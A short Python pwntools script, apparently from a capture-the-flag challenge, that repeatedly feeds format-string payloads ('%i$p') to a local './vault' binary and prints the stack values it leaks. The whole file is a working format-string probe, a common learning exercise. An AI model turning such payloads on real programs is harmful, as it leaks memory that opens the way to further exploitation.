from pwn import *

r = process("./vault")

i = 1
while i < 100:
    r.sendline(b'1')
    r.sendline(f"%{i}$p".encode())
    r.sendline(b"2")
    addr = r.recvline_contains("ur stuff").decode().split("ff: ")[-1].strip()
    print(f"{i}  --> {addr}")
    i+=1
    time.sleep(0.3)
    
